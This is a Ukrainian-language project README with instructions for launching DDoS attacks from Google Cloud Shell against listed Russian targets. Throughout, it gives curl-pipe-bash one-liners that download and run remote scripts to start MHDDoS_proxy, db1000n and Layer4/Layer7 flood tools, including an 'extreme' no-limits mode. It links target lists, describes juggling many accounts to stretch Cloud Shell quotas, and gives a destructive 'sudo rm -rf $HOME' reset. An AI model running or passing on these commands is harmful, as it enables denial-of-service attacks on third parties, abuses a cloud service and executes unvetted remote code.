# [DDoS whith Google Cloud Shell](https://sites.google.com/view/operationrussia/googleshell)
#### Scripts for durable cloudshell session. Test!     
#    
**[English version](https://github.com/Operation-Stop-russia/Gcloudshell_ddos/blob/main/README-EN.md)**
#
### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
### з ПК та смартфонів (*зі всього, що має браузер*;)
#
#### Браузерний спосіб (*підходить для використання від 1 до 20-30 акаунтів з одного ПК, якщо більше [Вам сюди](https://github.com/Operation-Stop-russia/Gcloudshell_ddos/tree/main/GShellSDK#readme)*)
:exclamation:• **Рекомендується використовувати 1 термінал на акаунт**.    
:exclamation:• **Максимальна тривалість сеансу Cloud Shell - 12 годин. Новий сеанс можна почати одразу після розриву.**    
:exclamation:• Враховуйте, що встановлені **тижневі квоти на використання, 1 акаунт - 50 годин у звичайному режимі та від 10 до 50 годин у ефемерному режимі** (*до закінчення квоти у звичайному режимі - вмикаємо Ephemeral Mode (ставимо - "Завжди") та отримуємо ще до 50 годин використання на поточний тиждень. Або навпаки - краще починати з ефемерного режиму*)    
:exclamation:• У [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) в налаштуваннях можна вимкнути статистику використання.    
• **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
#
### Стабільні сеанси (*90%*)
:white_check_mark:**Команда для встановлення та запуску MHDDoS_proxy (по [Layer7](https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst)):**
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
```
:white_check_mark: **Команда для встановлення та запуску db1000n:** 
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
``` 
#
### Тести/допрацювання/експерименти. 
**Нестабільні сеанси, перериваються** (потрібно часто перевіряти)      
  
:grey_question:**Layer4:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
```
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash    
```
:grey_question:**All targets:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/ALL.sh | bash
```
:grey_question:***--itarmy*:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
```
:grey_question:**Розділений термінал (Layer7+Layer4):**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
```    
#
### EXTREME MODE:zap:NoLimits (команди mhddos_proxy без параметрів)
 :exclamation: **Атаки виходять потужні але короткі + висока ймовірність отримати бан** (*бан зазвичай тимчасовий і стосується тільки доступу до GShell*)    
  
:zap:***--itarmy*:**
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/itarmyX.sh | bash
```
:zap:**Layer4:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/tcpX.sh | bash
```
:zap:**All targets:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/ALLx.sh | bash
```
#
#
#### Списки з цілями
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst
#
#
[IT ARMY of Ukraine](https://t.me/itarmyofukraine2022)
